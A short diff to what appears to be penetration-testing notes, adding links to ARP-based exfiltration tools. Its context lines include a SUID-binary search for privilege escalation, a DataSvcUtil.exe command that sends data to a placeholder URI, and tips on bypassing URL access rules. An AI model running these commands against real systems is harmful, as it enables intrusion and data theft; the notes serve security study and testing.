@@ -323,6 +323,9 @@ find / -perm -u=s -type f 2>/dev/null
     # https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-20e5e9c1ed8e
     C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe /out:C:\\temp\\foo /uri:https://foo?$data
     ```
+- ARP
+    - [GitHub \- nocommentlab/ARPExfiltrator: Data exfiltration over ARP request covert channel](https://github.com/nocommentlab/ARPExfiltrator)
+    - [GitHub \- kognise/arpchat: Answering the question nobody asked: what if you wanted to text your friends using only ARP?](https://github.com/kognise/arpchat)
 - URI scheme
     - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
 - bypass URL access rules with redirections (responses with code 3xx)
